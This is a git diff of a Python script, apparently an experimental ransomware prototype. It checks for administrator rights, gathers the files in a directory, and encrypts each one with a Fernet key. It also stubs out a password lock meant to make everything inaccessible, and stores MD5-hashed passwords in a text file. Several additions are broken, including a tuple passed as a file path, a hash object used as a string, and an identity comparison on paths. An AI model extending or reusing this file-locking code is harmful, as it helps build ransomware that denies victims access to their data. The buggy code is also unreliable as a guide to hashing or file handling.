@@ -1,9 +1,9 @@
-import csv
 import os
 import random
 import string
 import ctypes
 import sys
+import hashlib
 
 from cryptography.fernet import Fernet
 
@@ -18,6 +18,46 @@ def is_admin():
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
+
+def salt_password(password:str, salt:str):
+    '''
+    :param password: asked password
+    :param salt: salt to put on the pass word
+    :return: the salted password
+    '''
+    return  password+salt
+
+
+def password_unlock():
+    pass
+def password_lock(password:str):
+    '''
+    :param password: the password to lock the computer
+    :return: make everything inaccessible without the password
+    '''
+    pass
+
+def password_hash(salted_password:str):
+    '''
+    :param salted_password: password+salt
+    :return: password readable
+    '''
+    return hashlib.md5(salted_password.encode())
+
+def password_keep(hashed_password:str):
+    '''
+    :param hashed_password: hashed password to add to the file
+    :return: a file with hashed password
+    '''
+    file_to_oppen = '.\\password.txt',
+    with open(file_to_oppen,'r') as txt:
+        data = txt.read()
+    with open(file_to_oppen,'w') as txt:
+        txt.write(data+'\n pass: ' +hashed_password)
+
+
+
+
 
 
 def key_generator():
@@ -41,6 +81,8 @@ def get_all_accessible_files_in_Dir(init_path:str):
         print(f'invalide root {init_path}')
 
     return files
+
+
 
 
 def get_all_accessible_folder_in_dir(init_path:str):
@@ -128,7 +170,7 @@ def Get_Key_from_file(file_to_key:str):
 
 #write the key in a file
 def key_memory(F_keys:[]):
-    with  open('password.txt', 'w') as txt:
+    with open('Key.txt', 'w') as txt:
         for e in F_keys:
             txt.write(f'Key : {e.decode()}')
 
@@ -152,17 +194,19 @@ def key_memory(F_keys:[]):
 
 
 def main():
+    salt = ''
     # Look if program is admin
     if is_admin():
         keys = []
         files = get_all_accessible_files_in_Dir('.\\encrypt_thing')
-        folder_to_encrypt = '.\\encrypt_thing\\WAS2_Subnet_worksheet.docx'
+        own_dir = os.getcwd() # get is own directory to not encrypt it self
         for i in range(1):
             key = Fernet.generate_key() # key generator
             cipher = Fernet(key) # hash the key
             print(f'Key : {key.decode()}')
             for e in files:
-                encrypt_file(e, cipher)
+                if e is not own_dir:
+                    encrypt_file(e, cipher) # the file it receive
             keys.append(key)
         test = input("press enter to remove encryption")
         num = len(keys)
